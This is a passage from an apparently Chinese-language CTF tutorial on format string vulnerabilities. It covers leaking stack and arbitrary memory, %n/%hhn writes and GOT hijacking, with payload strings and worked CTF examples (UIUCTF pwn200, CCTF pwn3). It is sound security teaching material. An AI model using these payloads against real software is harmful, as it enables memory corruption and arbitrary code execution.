   0xffffcd04│+0x08: 0xffffcd10  →  "%3$x"  
   0xffffcd08│+0x0c: 0x000000c2  
   0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10  
   0xffffcd10│+0x14: "%3$x"     ← $eax  
   0xffffcd14│+0x18: 0xffffce00  →  0x00000001  
   0xffffcd18│+0x1c: 0x000000e0  
   gef➤  c  
   Continuing.  
   f7e8b6bb[Inferior 1 (process 57442) exited normally]  
     
  可以看出，我们确实获得了 printf 的第 4 个参数所对应的值 f7e8b6bb。  
 获取栈变量对应的字符串：  
  这里需要用%s，还是上面的程序，调试：  
  ![image](https://user-images.githubusercontent.com/96966904/148349635-49dd2037-0918-4546-9825-0880cdb00949.png)  
  ![image](https://user-images.githubusercontent.com/96966904/148349705-9b4cc08a-b809-4c3f-886f-f6829f8048b9.png)  
  可以看出，在第二次执行 printf 函数的时候，确实是将 0xffffcd04 处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。  
  当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。  
  此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第 printf 的第 3 个参数，如下，此时程序就不能够解析，就崩溃了。  
  ![image](https://user-images.githubusercontent.com/96966904/148349884-5335b125-96e7-4733-97b3-584d7198190a.png)  
 小技巧：  
  1.利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。   
  2.利用 %s 来获取变量所对应地址的内容，只不过有零截断。  
  3.利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。  
  
泄露任意地址内存：  
 在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。  
 有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。  
 一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中 s 是 main 函数的局部变量）。  
 那么也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。   
 我们选择上面的某个函数调用为例  
 ![image](https://user-images.githubusercontent.com/96966904/148500480-1270327e-539a-4ade-ac45-1d05d5898d02.png)  
 可以看出在栈上的第二个变量就是我们的格式化字符串地址 0xffffcd10，同时该地址存储的也确实是 "%s" 格式化字符串内容。  
 那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。  
 那我们就可以通过如下的方式来获取某个指定地址 addr 的内容。  
  addr%k$s  
 注： 在这里，如果格式化字符串在栈上，那么我们就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址 8 字节或者 16 字节。  
 通过如下方式确定该格式化字符串为第几个参数  
  [tag]%p%p%p%p%p%p...  
 一般来说，我们会重复某个字符的机器字长来作为tag，而后面会跟上若干个%p来输出栈上的内容，如果内容与我们前面的tag重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，  
 之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。  
 一般情况下，极其少见，我们也可以更换其他字符进行尝试，进行再次确认。  
 这里我们利用字符'A'作为特定字符，同时还是利用之前编译好的程序，如下  
  ➜  leakmemory git:(master) ✗ ./leakmemory  
  AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p  
  00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p  
  AAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7%  
 由 0x41414141 处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第 5 个参数，但是是格式化字符串的第 4 个参数。  
 我们可以来测试一下  
  ![image](https://user-images.githubusercontent.com/96966904/148501376-b22b2cdd-279a-46cf-a0a7-42271e44d49c.png)  
 程序崩溃了，这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，所以程序就崩溃了。  
 具体的可以参考下面的调试  
  ![image](https://user-images.githubusercontent.com/96966904/148501518-aef96510-ae9f-4f60-9579-f2333833ee57.png)  
  ![image](https://user-images.githubusercontent.com/96966904/148501566-a455ad0a-41bc-4bdb-81ec-a47991e6feb5.png)  
 显然 0xffffcd20 处所对应的格式化字符串所对应的变量值 0x73243425 并不能够被改程序访问，所以程序就自然崩溃了。   
 那么如果我们设置一个可访问的地址呢？比如说 scanf@got，结果会怎么样呢？应该自然是输出 scanf 对应的地址了。  
 我们不妨来试一下。  
 首先，获取 scanf@got 的地址，如下  
  gef➤  got  
    
  /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory：     文件格式 elf32-i386  
    
  DYNAMIC RELOCATION RECORDS  
  OFFSET   TYPE              VALUE  
  08049ffc R_386_GLOB_DAT    _gmon_start_  
  0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0  
  0804a010 R_386_JUMP_SLOT   _libc_start_main@GLIBC_2.0  
  0804a014 R_386_JUMP_SLOT   _isoc99_scanf@GLIBC_2.7   
    
 pwmtools构造payload：  
  ![image](https://user-images.githubusercontent.com/96966904/148503067-0f3a8da8-b7ea-4492-af3d-b53eb08f38c2.png)  
 其中，我们使用 gdb.attach(sh) 来进行调试。当我们运行到第二个 printf 函数的时候 (记得下断点)，可以看到我们的第四个参数确实指向我们的 scanf 的地址，这里输出  
  ![image](https://user-images.githubusercontent.com/96966904/148503158-8f8fc370-5f77-4027-808e-0f4aaf80aa67.png)  
 同时，运行的terninal：  
  ![image](https://user-images.githubusercontent.com/96966904/148503276-486f8690-c2eb-4d33-822b-634831ef447e.png)  
 我们确实得到了 scanf 的地址。  
 但是，并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，  
 有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，  
 一般来说，类似于下面的这个样子。  
  [padding][addr]  
 注意：  
  我们不能直接在命令行输入 \ x0c\xa0\x04\x08%4$s   
  这是因为虽然前面的确实是 printf@got 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 \,x,0,c 分别作为一个字符进行读入。  
  下面就是错误的例子。  
   ![image](https://user-images.githubusercontent.com/96966904/148503616-8d2e5e03-dcfa-449c-992f-f8517bfc2eb0.png)  
     
#### 覆盖内存  
上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，  
那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢? 答案是可行的，  
只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。  
这里我们可以想一下格式化字符串中的类型  
 %n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。  
通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的  
程序：  
 ![image](https://user-images.githubusercontent.com/96966904/148503946-f70d1e3e-004c-4ee0-9cb0-262b6670329f.png)  
makefile 在对应的文件夹中。而无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的 payload  
 ...[overwrite addr]....%[overwrite offset]$n  
其中... 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。  
所以一般来说，也是如下步骤：  
 确定覆盖地址  
 确定相对偏移  
 进行覆盖  
  
覆盖栈内存：
 确定覆盖地址：
  首先，我们自然是来想办法知道栈变量 c 的地址。  
  由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。  
 确定相对偏移：  
  其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()。   
  这里我们通过之前的泄露栈变量数值的方法来进行操作。  
  通过调试  
   ![image](https://user-images.githubusercontent.com/96966904/148504729-ef9f3792-ebec-416a-b4cf-574a0d4bedff.png)  
  我们可以发现在 0xffffcd14 处存储着变量 c 的数值。  
  继而，我们再确定格式化字符串'%d%d'的地址 0xffffcd28 相对于 printf 函数的格式化字符串参数 0xffffcd10 的偏移为 0x18，  
  即格式化字符串相当于 printf 函数的第 7 个参数，相当于格式化字符串的第 6 个参数。  
 进行覆盖：  
  这样，第 6 个参数处的值就是存储变量 c 的地址，我们便可以利用 %n 的特征来修改 c 的值。  
  payload 如下  
   [addr of c]%012d%6$n  
  addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。  
  具体脚本：  
   ![image](https://user-images.githubusercontent.com/96966904/148506047-e93d9457-d1c7-4a44-b97a-cfc376378963.png)  
  结果如下：  
   ![image](https://user-images.githubusercontent.com/96966904/148506220-812f0c2e-3faa-4e70-b63d-f5bad25640bf.png)  
   
 覆盖任意地址内容：  
  覆盖小数字  
   首先，我们来考虑一下如何修改 data 段的变量为一个较小的数字，比如说，小于机器字长的数字。这里以 2 为例。  
   可能会觉得这其实没有什么区别，可仔细一想，真的没有么？  
   如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。  
    或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。  
   那么我们应该怎么做呢？  
   再仔细想一下，我们有必要将所要覆盖的变量的地址放在字符串的最前面么？似乎没有，我们当时只是为了寻找偏移，所以才把tag放在字符串的最前面，如果我们把tag放在中间，其实也是无妨的。  
   类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。  
   前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，  
   故而格式化字符串的前面的字节必须是  
    aa%k$nxx  
   此时对应的存储的格式化字符串已经占据了 6 个字符的位置，  
   如果我们再添加两个字符 aa，那么其实 aa%k 就是第 6 个参数，$nxx 其实就是第 7 个参数，后面我们如果跟上我们要覆盖的地址，那就是第 8 个参数，  
   所以如果我们这里设置 k 为 8，其实就可以覆盖了。  
   利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。  
    ![image](https://user-images.githubusercontent.com/96966904/148508583-b174c9df-b95d-4a82-a11a-7aeaae1d7326.png)  
   构造代码：  
    ![image](https://user-images.githubusercontent.com/96966904/148508641-fbbcc77d-de35-4c64-8f2f-8da429365ca7.png)  
   对应的结果：  
    ![image](https://user-images.githubusercontent.com/96966904/148508745-b9165eff-9afa-4819-b31b-88c17f286cf6.png)  
   其实，这里我们需要掌握的小技巧就是，我们没有必要把地址放在最前面，放在哪里都可以，只要我们可以找到其对应的偏移即可。  
  覆盖大数字：  
   上面介绍了覆盖小数字，这里我们介绍如何覆盖大数字。  
   上面我们也说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，  
   那么有没有什么比较好的方式呢？自然是有了。  
   不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。  
   首先，所有的变量在内存中都是以字节进行存储的。  
   此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。  
   举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。  
   再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：  
    ![image](https://user-images.githubusercontent.com/96966904/148508976-c2f67896-cb57-488b-b9ae-8230d6024401.png)  
   所以说，我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。  
   这里，我们以单字节为例。  
   首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804A028。  
    ![image](https://user-images.githubusercontent.com/96966904/148509068-081f6e60-b1ee-4df0-a486-7c407af30f19.png)  
   即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。  
    ![image](https://user-images.githubusercontent.com/96966904/148509136-eb1708de-0e3c-46e9-b63f-f1f6f0f1be91.png)  
   首先，由于我们的字符串的偏移为 6，所以我们可以确定我们的 payload 基本是这个样子的  
    p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$n'+pad2+'%7$n'+pad3+'%8$n'+pad4+'%9$n'  
   依次进行计算。这里给出一个基本的构造：  
    ![image](https://user-images.githubusercontent.com/96966904/148509258-2a74e81d-5cd2-427b-bb81-08df093b1220.png)  
   其中每个参数的含义：  
    offset 表示要覆盖的地址最初的偏移  
    size 表示机器字长  
    addr 表示将要覆盖的地址。  
    target 表示我们要覆盖为的目的变量值。  
   相应的 exploit：  
    ![image](https://user-images.githubusercontent.com/96966904/148509392-78e7ae51-63bd-4793-bbd1-a937d67c64ab.png)  
   结果：  
    ![image](https://user-images.githubusercontent.com/96966904/148509439-82f20256-851c-4ded-b492-9659345846a8.png)  
   当然，我们也可以利用 %n 分别对每个地址进行写入，也可以得到对应的答案，  
   但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。  
   而采用 %hhn 则不会有这样的问题，因为这样只会修改相应地址的一个字节。  
     
### 格式化字符串漏洞例题  
#### 64位程序格式化字符串漏洞  
原理：  
 其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。  
 那么在格式化字符串漏洞中呢？虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。  
以 2017 年的 UIUCTF 中 pwn200 GoodLuck 为例进行介绍。这里由于只有本地环境，所以在本地设置了一个 flag.txt 文件。  
保护状态：
 ![image](https://user-images.githubusercontent.com/96966904/148509993-8f16b901-ed0b-468b-adca-86a4c7013f08.png)  
nx开启，开启部分relod  
程序的漏洞也很明显：  
 ![image](https://user-images.githubusercontent.com/96966904/148510126-4f344bee-cf03-4f2f-b55f-4f80838c77c3.png)  
确定偏移：我们在 printf 处下偏移如下, 这里只关注代码部分与栈部分。  
 ![image](https://user-images.githubusercontent.com/96966904/148510286-16ec954c-23dc-499c-8d7a-a21fe400d8cb.png)  
可以看到 flag 对应的栈上的偏移为 5，除去对应的第一行为返回地址外，其偏移为 4。  
此外，由于这是一个 64 位程序，所以前 6 个参数存在在对应的寄存器中，fmt 字符串存储在 RDI 寄存器中，所以 fmt 字符串对应的地址的偏移为 10。  
而 fmt 字符串中 %order$s 对应的 order 为 fmt 字符串后面的参数的顺序，所以我们只需要输入 %9$s 即可得到 flag 的内容。  
当然，我们还有更简单的方法利用 https://github.com/scwuaptx/Pwngdb 中的 fmtarg 来判断某个参数的偏移。  
 ![image](https://user-images.githubusercontent.com/96966904/148510460-893c37cf-1f2b-4527-af4a-add404dc5034.png)   
需要注意的是必须 break 在 printf 处。  
利用程序：  
 ![image](https://user-images.githubusercontent.com/96966904/148510574-1057cf7e-e795-4111-bea3-6ea52bff8305.png)  
  
#### hijack GOT  
在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。  
此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。  
因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。  
比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。  
假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤：  
 确定函数 A 的 GOT 表地址。  
  这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。  
 确定函数 B 的内存地址  
  这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。  
 将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。  
  这一步一般来说需要我们利用函数的漏洞来进行触发。  
  一般利用方法有如下两种：  
   写入函数：write 函数。  
   ROP  
    ![image](https://user-images.githubusercontent.com/96966904/148511074-d327cea8-ef79-4fda-8f13-f238ccae6e31.png)  
   格式化字符串任意地址写  
以 2016 CCTF 中的 pwn3 为例  
保护状态：  
 ![image](https://user-images.githubusercontent.com/96966904/148511192-bd6b9737-7ea8-43d1-b727-364dc5129387.png)  
开启了nx，默认开启了aslr   
首先分析程序，可以发现程序似乎主要实现了一个需密码登录的 ftp，具有 get，put，dir 三个基本功能。  
大概浏览一下每个功能的代码，发现在 get 功能中存在格式化字符串漏洞  
 ![image](https://user-images.githubusercontent.com/96966904/148511380-fe9c00d9-e055-4d4c-a475-75d4bc8e2eb3.png)  
既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路：  
 绕过密码  
 确定格式化字符串参数偏移  
 利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。  
 修改 puts@got 的内容为 system 的地址。  
 当程序再次执行 puts 函数的时候，其实执行的是 system 函数。  
直接上利用程序：  
 ![image](https://user-images.githubusercontent.com/96966904/148511535-d1665c04-14b1-4abc-b298-d785309637a3.png)  
 ![image](https://user-images.githubusercontent.com/96966904/148511586-402b459c-cf31-445f-b9d7-2fa98ff89085.png)  
 ![image](https://user-images.githubusercontent.com/96966904/148511635-844046cb-4114-4158-8240-2f2fee427bd4.png)  
注意：  
 我在获取 puts 函数地址时使用的偏移是 8，这是因为我希望我输出的前 4 个字节就是 puts 函数的地址。其实格式化字符串的首地址的偏移是 7。  
 这里我利用了 pwntools 中的 fmtstr_payload 函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。  
 比如这里 fmtstr_payload(7, {puts_got: system_addr}) 的意思就是，我的格式化字符串的偏移是 7，我希望在 puts_got 地址处写入 system_addr 地址。   
 默认情况下是按照字节来写的。  
  
#### hijack retaddr  
